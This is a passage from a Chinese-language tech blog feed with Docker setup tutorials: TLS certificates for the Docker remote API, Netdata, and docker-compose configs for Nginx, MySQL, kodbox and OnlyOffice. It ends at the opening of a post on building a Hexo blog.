class="hljs-string">&quot;Hangzhou&quot;</span><br>ORGANIZATION=<span class="hljs-string">&quot;nicetry&quot;</span><br>ORGANIZATIONAL_UNIT=<span class="hljs-string">&quot;Dev&quot;</span><br>EMAIL=<span class="hljs-string">&quot;nicetry@163.com&quot;</span><br> <br><span class="hljs-comment">###开始生成文件###</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;开始生成文件&quot;</span><br><span class="hljs-comment">#创建密钥文件夹</span><br><span class="hljs-built_in">mkdir</span> -p /usr/local/ca<br><span class="hljs-comment">#切换到生产密钥的目录</span><br><span class="hljs-built_in">cd</span> /usr/local/ca  <br><span class="hljs-comment">#生成ca私钥(使用aes256加密)</span><br>openssl genrsa -aes256 -passout pass:<span class="hljs-variable">$PASSWORD</span>  -out ca-key.pem 4096<br><span class="hljs-comment">#生成ca证书，填写配置信息</span><br>openssl req -new -x509 -passin <span class="hljs-string">&quot;pass:<span class="hljs-variable">$PASSWORD</span>&quot;</span> -days 3650 -key ca-key.pem -sha256 -out ca.pem -subj <span class="hljs-string">&quot;/C=<span class="hljs-variable">$COUNTRY</span>/ST=<span class="hljs-variable">$STATE</span>/L=<span class="hljs-variable">$CITY</span>/O=<span class="hljs-variable">$ORGANIZATION</span>/OU=<span class="hljs-variable">$ORGANIZATIONAL_UNIT</span>/CN=<span class="hljs-variable">$SERVER</span>/emailAddress=<span class="hljs-variable">$EMAIL</span>&quot;</span><br> <br><span class="hljs-comment">#生成server证书私钥文件</span><br>openssl genrsa -out server-key.pem 4096<br><span class="hljs-comment">#生成server证书请求文件</span><br>openssl req -subj <span class="hljs-string">&quot;/CN=<span class="hljs-variable">$SERVER</span>&quot;</span> -new -key server-key.pem -out server.csr<br><span class="hljs-comment">#配置白名单  你使用的是服务器Ip的话,请将前面的DNS换成IP  echo subjectAltName = IP:$SERVER,IP:0.0.0.0 &gt;&gt; extfile.cnf</span><br>sh -c  <span class="hljs-string">&#x27;echo &quot;subjectAltName = DNS:&#x27;</span><span class="hljs-variable">$SERVER</span><span class="hljs-string">&#x27;,IP:0.0.0.0&quot; &gt;&gt; extfile.cnf&#x27;</span><br>sh -c  <span class="hljs-string">&#x27;echo &quot;extendedKeyUsage = serverAuth&quot; &gt;&gt; extfile.cnf&#x27;</span><br><span class="hljs-comment">#使用CA证书及CA密钥以及上面的server证书请求文件进行签发，生成server自签证书</span><br>openssl x509 -req -days 3650 -<span class="hljs-keyword">in</span> server.csr -CA ca.pem -CAkey ca-key.pem -passin <span class="hljs-string">&quot;pass:<span class="hljs-variable">$PASSWORD</span>&quot;</span> -CAcreateserial  -out server-cert.pem  -extfile extfile.cnf<br> <br><span class="hljs-comment">#生成client证书RSA私钥文件</span><br>openssl genrsa -out key.pem 4096<br><span class="hljs-comment">#生成client证书请求文件</span><br>openssl req -subj <span class="hljs-string">&#x27;/CN=client&#x27;</span> -new -key key.pem -out client.csr<br> <br>sh -c <span class="hljs-string">&#x27;echo extendedKeyUsage=clientAuth &gt;&gt; extfile.cnf&#x27;</span><br><span class="hljs-comment">#生成client自签证书（根据上面的client私钥文件、client证书请求文件生成）</span><br>openssl x509 -req -days 3650 -<span class="hljs-keyword">in</span> client.csr -CA ca.pem -CAkey ca-key.pem  -passin <span class="hljs-string">&quot;pass:<span class="hljs-variable">$PASSWORD</span>&quot;</span> -CAcreateserial -out cert.pem  -extfile extfile.cnf<br> <br><span class="hljs-comment">#更改密钥权限</span><br><span class="hljs-built_in">chmod</span> 0400 ca-key.pem key.pem server-key.pem<br><span class="hljs-comment">#更改密钥权限</span><br><span class="hljs-built_in">chmod</span> 0444 ca.pem server-cert.pem cert.pem<br><span class="hljs-comment">#删除无用文件</span><br><span class="hljs-built_in">rm</span> client.csr server.csr<br><span class="hljs-comment">#复制密钥文件</span><br><span class="hljs-built_in">cp</span> server-*.pem /etc/docker/<br><span class="hljs-built_in">cp</span> ca.pem /etc/docker/<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;生成文件完成&quot;</span><br><span class="hljs-comment">###生成结束###</span><br></code></pre></td></tr></table></figure><p>执行脚本，在<code>/usr/local/ca/</code> 目录下生成ca证书</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sh tls.sh<br></code></pre></td></tr></table></figure><p>修改docker配置文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim /usr/lib/systemd/system/docker.service<br><span class="hljs-comment"># 找到以下行，修改为</span><br>ExecStart=/usr/bin/dockerd --tlsverify --tlscacert=/usr/local/ca/ca.pem --tlscert=/usr/local/ca/server-cert.pem --tlskey=/usr/local/ca/server-key.pem -H tcp://0.0.0.0:2375 -H unix://var/run/docker.sock --containerd=/run/containerd/containerd.sock<br><span class="hljs-comment"># 重启docker，同时需放开2375端口防火墙</span><br>systemctl daemon-reload<br>systemctl restart docker<br></code></pre></td></tr></table></figure><p>在<code>Portainer</code>中使用<code>TLS</code> 方式，上传<code>cert.pem</code> 、<code>key.pem</code> 文件</p><p><img src="/../blog-assets/docker%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85/1654156409795.png" alt="1654156409795"></p><h1 id="docker安装netdata"><a href="#docker安装netdata" class="headerlink" title="docker安装netdata"></a>docker安装netdata</h1><blockquote><p> Netdata 是一款 Linux 性能实时监测工具 ，其自身是一个高度优化的 Linux 守护进程，它为 Linux 系统，应用程序，SNMP 服务等提供实时的性能监测，并通过可视化图表信息呈现至web页面</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 获取netdata镜像</span><br>docker search netdata<br>docker pull netdata/netdata<br><span class="hljs-comment"># 启动</span><br>docker run -d --name=netdata \<br>  -p 19999:19999 \<br>  -v netdataconfig:/etc/netdata \<br>  -v netdatacache:/var/cache/netdata \<br>  -v netdatalib:/var/lib/netdata \<br>  -v /etc/passwd:/host/etc/passwd:ro \<br>  -v /etc/group:/host/etc/group:ro \<br>  -v /proc:/host/proc:ro \<br>  -v /sys:/host/sys:ro \<br>  -v /etc/os-release:/host/etc/os-release:ro \<br>  --restart unless-stopped \<br>  --cap-add SYS_PTRACE \<br>  --security-opt apparmor=unconfined \<br>  netdata/netdata<br>  <br><span class="hljs-comment"># 查看容器状态，通过 ip:19999 访问web页面</span><br>docker ps -a<br></code></pre></td></tr></table></figure><h1 id="docker-compose安装"><a href="#docker-compose安装" class="headerlink" title="docker-compose安装"></a>docker-compose安装</h1><blockquote><p>docker-compose项目是<a href="https://cloud.tencent.com/product/tke?from=10680">Docker</a>官方的开源项目，负责实现对Docker<a href="https://cloud.tencent.com/product/tke?from=10680">容器</a>集群的快速编排。它是一个定义和运行多容器的 docker应用工具。使用compose，你能通过YMAL文件配置你自己的服务，然后通过一个命令，你能使用配置文件 创建和运行所有的服务。重点可以启动多个容器！ </p></blockquote><h2 id="方式一：通过pip3安装"><a href="#方式一：通过pip3安装" class="headerlink" title="方式一：通过pip3安装"></a>方式一：通过pip3安装</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 安装pip</span><br>yum -y install python-pip<br><span class="hljs-comment"># 更新pip3</span><br>pip3 install --upgrade pip<br><span class="hljs-comment"># 安装docker-compose</span><br>pip3 install docker-compose<br><span class="hljs-comment"># 查看docker-compose版本</span><br>docker-compose version<br></code></pre></td></tr></table></figure><h2 id="方式二：离线安装"><a href="#方式二：离线安装" class="headerlink" title="方式二：离线安装"></a>方式二：离线安装</h2><p> 访问<a href="https://github.com/docker/compose/releases%EF%BC%8C%E4%B8%8B%E8%BD%BD">https://github.com/docker/compose/releases，下载</a> <code>docker-compose-Linux-x86_64</code> ，下载后重命名文件为 <code>docker-compose</code> ，可通过FTP工具上传到服务器<code>/usr/local/bin/</code> 目录下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 添加可执行权限</span><br>sudo <span class="hljs-built_in">chmod</span> +x /usr/local/bin/docker-compose<br><span class="hljs-comment"># 查看docker-compose版本</span><br>docker-compose verison<br></code></pre></td></tr></table></figure><h1 id="docker-compose-安装-Nginx"><a href="#docker-compose-安装-Nginx" class="headerlink" title="docker-compose 安装 Nginx"></a>docker-compose 安装 Nginx</h1><p>创建<code>nginx</code> 目录，在目录下编辑 <code>docker-compose.yml</code> 文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> -p /opt/docker/nginx &amp;&amp; <span class="hljs-built_in">cd</span> /opt/docker/nginx<br>vim docker-compose.yml<br></code></pre></td></tr></table></figure><p>内容如下，<code>version</code> 版本号需要与<code>docker-compose</code> 版本对应，不然会报错</p><p>CentOS7中Docker文件挂载，容器中没有执行权限，故需添加参数</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">version:</span> <span class="hljs-string">&#x27;3&#x27;</span><br><span class="hljs-attr">services:</span><br>    <span class="hljs-attr">nginx:</span><br>        <span class="hljs-attr">image:</span> <span class="hljs-string">nginx</span>     <span class="hljs-comment"># 镜像名称</span><br>        <span class="hljs-attr">container_name:</span> <span class="hljs-string">nginx</span>     <span class="hljs-comment"># 容器名字</span><br>        <span class="hljs-attr">restart:</span> <span class="hljs-string">always</span>     <span class="hljs-comment"># 开机自动重启</span><br>        <span class="hljs-attr">ports:</span>     <span class="hljs-comment"># 端口号绑定（宿主机:容器内）</span><br>            <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;80:80&#x27;</span><br>            <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;443:443&#x27;</span><br>        <span class="hljs-attr">volumes:</span>      <span class="hljs-comment"># 目录映射（宿主机:容器内）</span><br>            <span class="hljs-bullet">-</span> <span class="hljs-string">./conf/nginx.conf:/etc/nginx/nginx.conf</span><br>            <span class="hljs-bullet">-</span> <span class="hljs-string">./conf.d:/etc/nginx/conf.d</span><br>            <span class="hljs-bullet">-</span> <span class="hljs-string">./html:/usr/share/nginx/html</span><br></code></pre></td></tr></table></figure><p>需要事先准备<code>nginx.conf</code> 文件在挂载目录<code>./conf/nginx.conf</code>，否则会报试图将文件挂载至目录的错误（_因docker挂载目录文件，若挂载的宿主机目录不存在默认会创建一个新<code>directory</code> ，若原本想挂载的是 <code>file</code> 而docker默认创建的是<code>directory</code> 则会报该错误_）</p><ul><li><code>nginx.conf</code>配置如下</li></ul><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment">#user  nobody;</span><br><span class="hljs-string">worker_processes</span>  <span class="hljs-number">1</span><span class="hljs-string">;</span><br><br><span class="hljs-string">events</span> &#123;<br>    <span class="hljs-string">worker_connections</span>  <span class="hljs-number">1024</span><span class="hljs-string">;</span><br>&#125;<br><br><br><span class="hljs-string">http</span> &#123;<br>    <span class="hljs-string">include</span>       <span class="hljs-string">mime.types;</span><br>    <span class="hljs-string">default_type</span>  <span class="hljs-string">application/octet-stream;</span><br><br>    <span class="hljs-string">sendfile</span>        <span class="hljs-string">on;</span><br><br>    <span class="hljs-string">keepalive_timeout</span>  <span class="hljs-number">65</span><span class="hljs-string">;</span><br><br>    <span class="hljs-string">server</span> &#123;<br>        <span class="hljs-string">listen</span>       <span class="hljs-number">80</span><span class="hljs-string">;</span><br>        <span class="hljs-string">server_name</span>  <span class="hljs-string">localhost;</span><br><br>        <span class="hljs-comment">#access_log  logs/host.access.log  main;</span><br><br>        <span class="hljs-string">location</span> <span class="hljs-string">/</span> &#123;<br>            <span class="hljs-string">root</span>   <span class="hljs-string">/usr/share/nginx/html;</span><br>            <span class="hljs-string">index</span>  <span class="hljs-string">index.html</span> <span class="hljs-string">index.htm;</span><br>        &#125;<br><br>        <span class="hljs-comment">#error_page  404              /404.html;</span><br><br>        <span class="hljs-comment"># redirect server error pages to the static page /50x.html</span><br>        <span class="hljs-comment">#</span><br>        <span class="hljs-string">error_page</span>   <span class="hljs-number">500</span> <span class="hljs-number">502</span> <span class="hljs-number">503</span> <span class="hljs-number">504</span>  <span class="hljs-string">/50x.html;</span><br>        <span class="hljs-string">location</span> <span class="hljs-string">=</span> <span class="hljs-string">/50x.html</span> &#123;<br>            <span class="hljs-string">root</span>   <span class="hljs-string">html;</span><br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>需要注意<code> location</code> 中 <code>root</code> 的配置，因为之前选择了挂载，所以需要填写为容器内的<code>html</code> 路径，否则会报<code>404</code> 错误</p><p>至此 <code>nginx</code> 目录结构为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">|-- conf<br>|   `-- nginx.conf<br>|-- conf.d<br>|-- docker-compose.yml<br>`-- html<br>    |`-- index.html<br></code></pre></td></tr></table></figure><p>执行命令启动Nginx容器，通过 <code>ip:80</code> 访问是否启动成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker-compose up -d nginx<br></code></pre></td></tr></table></figure><h1 id="docker-compose-安装-MySQL"><a href="#docker-compose-安装-MySQL" class="headerlink" title="docker-compose 安装 MySQL"></a>docker-compose 安装 MySQL</h1><p>创建 <code>MySQL</code> 目录，在目录下编辑 <code>docker-compose.yml</code> 文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> -p /opt/docker/mysql &amp;&amp; <span class="hljs-built_in">cd</span> /opt/docker/mysql<br>vim docker-compose.yml<br></code></pre></td></tr></table></figure><p>内容如下</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">version:</span> <span class="hljs-string">&#x27;3&#x27;</span><br><span class="hljs-attr">services:</span><br>    <span class="hljs-attr">mysql:</span><br>        <span class="hljs-attr">image:</span> <span class="hljs-string">mysql</span>  <span class="hljs-comment">#mysql镜像，可指定标签</span><br>        <span class="hljs-attr">container_name:</span> <span class="hljs-string">mysql-db</span>  <span class="hljs-comment">#容器名</span><br>        <span class="hljs-attr">command:</span> <span class="hljs-string">mysqld</span> <span class="hljs-string">--character-set-server=utf8mb4</span> <span class="hljs-string">--collation-server=utf8mb4_unicode_ci</span> <span class="hljs-comment">#设置utf8字符集</span><br>        <span class="hljs-attr">restart:</span> <span class="hljs-string">always</span><br>        <span class="hljs-attr">environment:</span><br>        <span class="hljs-attr">MYSQL_ROOT_PASSWORD:</span> <span class="hljs-string">root</span> <span class="hljs-comment">#root管理员用户密码</span><br>        <span class="hljs-attr">ports:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;3306:3306&#x27;</span>  <span class="hljs-comment">#host物理直接映射端口为6606</span><br>        <span class="hljs-attr">volumes:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">./data/db:/var/lib/mysql</span>  <span class="hljs-comment">#mysql数据库挂载到host物理机目录/e/docker/mysql/data/db</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">./data/conf:/etc/mysql/conf.d</span>  <span class="hljs-comment">#容器的配置目录挂载到host物理机目录/e/docker/mysql/data/conf </span><br></code></pre></td></tr></table></figure><p>执行命令启动 <code>MySQL</code> 容器，查看是否启动成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker-compose up -d mysql<br><span class="hljs-comment"># 进入容器</span><br>docker <span class="hljs-built_in">exec</span> -it mysql-db bash<br><span class="hljs-comment"># 登录mysql</span><br>mysql -uroot -p你的密码<br><span class="hljs-comment"># 切换数据库</span><br>use mysql<br><span class="hljs-comment"># 授予用户所有远程访问权限</span><br>grant all privileges on *.* to <span class="hljs-string">&#x27;root&#x27;</span>@<span class="hljs-string">&#x27;%&#x27;</span>;<br><span class="hljs-comment"># 修改用户加密方式为 mysql_native_password</span><br>alter user <span class="hljs-string">&#x27;root&#x27;</span>@<span class="hljs-string">&#x27;%&#x27;</span> identified with mysql_native_password by <span class="hljs-string">&#x27;你的密码&#x27;</span>;<br><span class="hljs-comment"># 刷新生效，可使用db客户端远程连接数据库（若未及时生效，可重启容器）</span><br>flush privileges;<br></code></pre></td></tr></table></figure><h1 id="docker-compose-安装-kodbox"><a href="#docker-compose-安装-kodbox" class="headerlink" title="docker-compose 安装 kodbox"></a>docker-compose 安装 kodbox</h1><p>创建 <code>MySQL</code> 目录， 创建文件.env来设置环境变量（必须修改等号右边的值，形式如 <code>MYSQL_USER=kodbox</code>，值不要包含&amp;符号），这些在docker启动时会自动传入容器 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> -p /opt/docker/kodbox &amp;&amp; <span class="hljs-built_in">cd</span> /opt/docker/kodbox<br>vim .<span class="hljs-built_in">env</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">MYSQL_ROOT_PASSWORD=root<br>MYSQL_DATABASE=kodbox<br>MYSQL_USER=kodbox<br>MYSQL_PASSWORD=kodbox<br></code></pre></td></tr></table></figure><p>在目录下创建 <code>docker-compose.yml</code> 文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim docker-compose.yml<br></code></pre></td></tr></table></figure><p>内容如下</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">version:</span> <span class="hljs-string">&#x27;3.5&#x27;</span><br><br><span class="hljs-attr">services:</span><br>  <span class="hljs-attr">db:</span><br>      <span class="hljs-attr">image:</span> <span class="hljs-string">mariadb</span>  <span class="hljs-comment">#mysql镜像，可指定标签</span><br>      <span class="hljs-attr">command:</span> <span class="hljs-string">--transaction-isolation=READ-COMMITTED</span> <span class="hljs-string">--binlog-format=ROW</span><br>      <span class="hljs-attr">restart:</span> <span class="hljs-string">always</span><br>      <span class="hljs-attr">environment:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;TZ=Asia/Shanghai&quot;</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;MYSQL_ROOT_PASSWORD&quot;</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;MYSQL_DATABASE&quot;</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;MYSQL_USER&quot;</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;MYSQL_PASSWORD&quot;</span><br>      <span class="hljs-attr">volumes:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;./data/mysql/db:/var/lib/mysql&quot;</span>  <span class="hljs-comment">#mysql数据库挂载到host物理机目录/e/docker/mysql/data/db</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;./data/mysql/conf:/etc/mysql/conf.d&quot;</span>  <span class="hljs-comment">#容器的配置目录挂载到host物理机目录/e/docker/mysql/data/conf </span><br>      <br>  <span class="hljs-attr">app:</span><br>      <span class="hljs-attr">image:</span> <span class="hljs-string">kodcloud/kodbox</span><br>      <span class="hljs-attr">ports:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-number">5890</span><span class="hljs-string">:80</span>                       <span class="hljs-comment">#左边80是使用端口，可以修改</span><br>      <span class="hljs-attr">links:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">db</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">redis</span><br>      <span class="hljs-attr">volumes:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;./site:/var/www/html&quot;</span>      <span class="hljs-comment">#./site是站点目录位置，可以修改</span><br>      <span class="hljs-attr">restart:</span> <span class="hljs-string">always</span><br><br>  <span class="hljs-attr">redis:</span><br>      <span class="hljs-attr">image:</span> <span class="hljs-string">redis:alpine</span><br>      <span class="hljs-attr">environment:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;TZ=Asia/Shanghai&quot;</span><br>      <span class="hljs-attr">restart:</span> <span class="hljs-string">always</span><br>      <span class="hljs-attr">volumes:</span>      <br>        <span class="hljs-bullet">-</span> <span class="hljs-string">./data/redis/data:/data</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">./data/redis/conf/redis.conf:/etc/redis/redis.conf</span><br></code></pre></td></tr></table></figure><p>执行命令启动 <code>kodbox</code>、<code>mysql</code>、<code>redis</code> 三个容器，查看是否启动成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker-compose up -d<br></code></pre></td></tr></table></figure><p>启动成功后通过 <code>IP:5890</code> 访问网盘安装页面，在数据库配置页面修改将<code>MySQL</code> 和 <code>Redis</code>修改如下即可正常访问网盘</p><p><img src="/../blog-assets/docker%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85/1692107656366.png" alt="1692107656366"></p><h1 id="docker-compose-安装-Onlyoffice"><a href="#docker-compose-安装-Onlyoffice" class="headerlink" title="docker-compose 安装 Onlyoffice"></a>docker-compose 安装 Onlyoffice</h1><p>创建 <code>Onlyoffice</code> 目录，在目录下创建 <code>docker-compose.yml</code> 文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> -p /opt/docker/onlyoffice &amp;&amp; <span class="hljs-built_in">cd</span> /opt/docker/onlyoffice<br>vim docker-compose.yml<br></code></pre></td></tr></table></figure><p>内容如下</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">version:</span> <span class="hljs-string">&#x27;3.5&#x27;</span><br><span class="hljs-attr">services:</span><br>    <span class="hljs-attr">onlyoffice:</span><br>        <span class="hljs-attr">image:</span> <span class="hljs-string">onlyoffice/documentserver</span>     <span class="hljs-comment"># 镜像名称</span><br>        <span class="hljs-attr">container_name:</span> <span class="hljs-string">onlyoffice</span>     <span class="hljs-comment"># 容器名字</span><br>        <span class="hljs-attr">restart:</span> <span class="hljs-string">always</span>     <span class="hljs-comment"># 开机自动重启</span><br>        <span class="hljs-attr">ports:</span>     <span class="hljs-comment"># 端口号绑定（宿主机:容器内）</span><br>            <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;76531:80&#x27;</span><br>        <span class="hljs-attr">volumes:</span>      <span class="hljs-comment"># 目录映射（宿主机:容器内）</span><br>            <span class="hljs-bullet">-</span> <span class="hljs-string">./data/logs:/var/log/onlyoffice</span><br>            <span class="hljs-bullet">-</span> <span class="hljs-string">./data/data:/var/www/onlyoffice/Data</span> <br>            <span class="hljs-bullet">-</span> <span class="hljs-string">./data/lib:/var/lib/onlyoffice</span> <br>            <span class="hljs-bullet">-</span> <span class="hljs-string">./data/db:/var/lib/postgresql</span> <br></code></pre></td></tr></table></figure><p>执行命令启动 <code>Onlyoffice</code> 容器，查看是否启动成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker-compose up -d<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>DevOps</category>
      
      <category>环境搭建</category>
      
    </categories>
    
    
    <tags>
      
      <tag>docker</tag>
      
      <tag>ssh</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>基于Hexo的个人博客搭建</title>
    <link href="/2022/06/07/%E5%9F%BA%E4%BA%8EGithub%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
    <url>/2022/06/07/%E5%9F%BA%E4%BA%8EGithub%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<blockquote><p>使用 Hexo 博客框架快速搭建个人博客，配合 Github Pages 实现博客部署及域名访问</p></blockquote><h2 id="Hexo安装"><a href="#Hexo安装" class="headerlink" title="Hexo安装"></a>Hexo安装</h2><ul><li>前置环境：安装<code>Node.js</code>、<code>git</code></li></ul><h3 id="配置本地git-仓库"><a href="#配置本地git-仓库" class="headerlink" title="配置本地git 仓库"></a>配置本地<code>git</code> 仓库</h3><p> 找到Git安装目录，打开Git Bash窗口，设置user.name和 user.email  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">git config --global user.name niceday<br>git config --global user.email niceday@163.com<br></code></pre></td></tr></table></figure><p>配置Git公钥</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ssh-keygen -t rsa -C &quot;niceday@163.com&quot;<br></code></pre></td></tr></table></figure><p>连按三个回车后，得到生成的公钥文件 <code>id_rsa.pub</code> ，复制其中的内容，添加到Github的<code>SSH KEY</code> 中，添加完成后，使用以下命令查看是否添加成功</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ssh git@github.com<br></code></pre></td></tr></table></figure><h3 id="Hexo搭建"><a href="#Hexo搭建" class="headerlink" title="Hexo搭建"></a>Hexo搭建</h3><p>Hexo 官方文档：  <a href="https://hexo.io/zh-cn/docs/index.html">文档 | Hexo</a> 